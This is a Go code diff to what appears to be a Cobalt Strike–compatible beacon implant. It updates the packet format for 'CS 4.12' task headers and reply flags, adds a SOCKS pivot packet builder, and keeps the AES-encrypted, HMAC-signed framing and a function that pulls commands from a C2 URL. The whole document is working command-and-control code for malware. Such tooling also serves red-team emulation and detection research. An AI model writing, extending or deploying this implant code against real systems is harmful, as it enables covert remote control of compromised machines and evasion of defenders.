@@ -90,7 +90,6 @@ func DetectTaskHeaderLen(taskData []byte, totalLen uint32) int {
 
 func ParsePacket(buf *bytes.Buffer, totalLen *uint32, taskHeaderLen int) (uint32, [8]byte, []byte, error) {
 	var taskID [8]byte
-
 	commandTypeBytes := make([]byte, 4)
 	_, err := buf.Read(commandTypeBytes)
 	if err != nil {
@@ -104,7 +103,7 @@ func ParsePacket(buf *bytes.Buffer, totalLen *uint32, taskHeaderLen int) (uint32
 	}
 	commandLen := ReadInt(commandLenBytes)
 
-	// Read per-task header if present (CS 4.12+)
+	// Extract per-task header (taskID) if present (CS 4.12+)
 	if taskHeaderLen > 0 {
 		headerBytes := make([]byte, taskHeaderLen)
 		_, err = buf.Read(headerBytes)
@@ -131,19 +130,16 @@ func MakePacket(replyType int, taskID [8]byte, b []byte) []byte {
 	binary.BigEndian.PutUint32(counterBytes, uint32(constants.Counter))
 	buf.Write(counterBytes)
 
-	// resultLen = 4 (replyType) + 8 (taskID) + len(data)
 	dataLen := len(b)
 	resultLen := 4 + 8 + dataLen
 	resultLenBytes := make([]byte, 4)
 	binary.BigEndian.PutUint32(resultLenBytes, uint32(resultLen))
 	buf.Write(resultLenBytes)
 
-	// OR the reply type with MSB flag (0x80000000) for CS 4.12
 	replyTypeBytes := make([]byte, 4)
 	binary.BigEndian.PutUint32(replyTypeBytes, uint32(replyType)|0x80000000)
 	buf.Write(replyTypeBytes)
 
-	// Prepend task ID before data
 	buf.Write(taskID[:])
 	buf.Write(b)
 
@@ -152,6 +148,45 @@ func MakePacket(replyType int, taskID [8]byte, b []byte) []byte {
 		return nil
 	}
 	// cut the zero because Golang's AES encrypt func will padding IV(block size in this situation is 16 bytes) before the cipher
+	encrypted = encrypted[16:]
+
+	buf.Reset()
+
+	sendLen := len(encrypted) + cryptography.HmacHashLen
+	sendLenBytes := make([]byte, 4)
+	binary.BigEndian.PutUint32(sendLenBytes, uint32(sendLen))
+	buf.Write(sendLenBytes)
+	buf.Write(encrypted)
+	hmacHashBytes := cryptography.HmacHash(encrypted)
+	buf.Write(hmacHashBytes)
+
+	return buf.Bytes()
+}
+
+// MakePacketPivot builds a result packet without MSB flag or taskID — for SOCKS callbacks only
+func MakePacketPivot(replyType int, b []byte) []byte {
+	constants.Counter += 1
+	buf := new(bytes.Buffer)
+	counterBytes := make([]byte, 4)
+	binary.BigEndian.PutUint32(counterBytes, uint32(constants.Counter))
+	buf.Write(counterBytes)
+
+	dataLen := len(b)
+	resultLen := 4 + dataLen
+	resultLenBytes := make([]byte, 4)
+	binary.BigEndian.PutUint32(resultLenBytes, uint32(resultLen))
+	buf.Write(resultLenBytes)
+
+	replyTypeBytes := make([]byte, 4)
+	binary.BigEndian.PutUint32(replyTypeBytes, uint32(replyType))
+	buf.Write(replyTypeBytes)
+
+	buf.Write(b)
+
+	encrypted, err := cryptography.AesCBCEncrypt(buf.Bytes(), constants.AesKey)
+	if err != nil {
+		return nil
+	}
 	encrypted = encrypted[16:]
 
 	buf.Reset()
@@ -313,4 +348,3 @@ func PullCommand() *http.Response {
 	resp := HttpGet(constants.GetUrl, encryptedMetaInfo)
 	return resp
 }
-
